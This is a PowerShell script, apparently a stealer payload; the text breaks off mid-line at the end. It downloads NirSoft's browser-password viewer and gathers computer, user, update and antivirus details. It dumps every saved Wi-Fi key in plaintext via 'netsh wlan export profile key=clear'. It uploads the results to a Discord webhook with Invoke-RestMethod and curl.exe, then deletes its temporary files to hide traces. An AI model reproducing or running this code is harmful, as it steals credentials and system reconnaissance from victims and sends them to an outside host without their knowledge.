$desktop = [Environment]::GetFolderPath("Desktop")
$tempDir = "C:\Temp"

function Get-Nirsoft {
    Set-Location $tempDir
    mkdir temp -Force
    Set-Location temp
    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
    Expand-Archive 7z.zip
    .\7z\7za.exe e wbpv.zip
}

function SysInfo {
    # Create the temporary folder if it doesn't exist
    mkdir $tempDir -Force
    Set-Location $tempDir

    # Get user information
    $date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
    $namepc = $env:computername
    $user = $env:UserName
    $userInfo = "Computer Name : $namepc`r`nUser : $user`r`nDate : $date"
    $userInfo | Out-File -FilePath "$tempDir\UserInfo.txt" -Encoding utf8

    # Get system information
    Get-ComputerInfo | Out-File -FilePath "$tempDir\ComputerInfo.txt" -Encoding utf8

    # Generate a report of installed updates
    $Report = "Update Report`r`n`r`nGenerated on: $(Get-Date)`r`n`r`nInstalled Updates:`r`n"
    Get-WmiObject Win32_QuickFixEngineering | Sort-Object InstalledOn -Descending | ForEach-Object {
        $Report += "Description: $($_.Description)`r`nHotFixId: $($_.HotFixId)`r`nInstalledOn: $($_.InstalledOn)`r`nInstalledBy: $($_.InstalledBy)`r`n`r`n"
    }
    $Report | Out-File -FilePath "$tempDir\WinUpdates.txt" -Encoding utf8

    # Upload files to Discord
    Upload-Discord -file "$tempDir\UserInfo.txt" -text "User Informations :"
    Upload-Discord -file "$tempDir\ComputerInfo.txt" -text "Computer Informations :"
    Upload-Discord -file "$tempDir\WinUpdates.txt" -text "Updates Informations :"

    # Remove temporary files
    Remove-Item -Path $tempDir -Recurse -Force
}

function Upload-Discord {
    param (
        [string]$file,
        [string]$text
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)) {
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

function Wifi {
    Set-Location $tempDir
    mkdir "js2k3kd4nne5dhsk" -ItemType Directory
    Set-Location "$tempDir\js2k3kd4nne5dhsk"
    netsh wlan export profile key=clear
    Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
        $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
    } | Out-File -FilePath "$desktop\0.txt"
    Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
    Set-Location $tempDir
    Remove-Item -Path "$tempDir\js2k3kd4nne5dhsk" -Force -Recurse
}

function Del-Nirsoft-File {
    Remove-Item -Path $tempDir -Recurse -Force
}

function version-av {
    Set-Location $tempDir
    mkdir temp -Force
    Set-Location temp
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath "$tempDir\resultat.txt" -Encoding utf8
    Upload-Discord -file "$tempDir\resultat.txt" -text "Anti-spyware version:"
    Remove-Item -Path $tempDir -
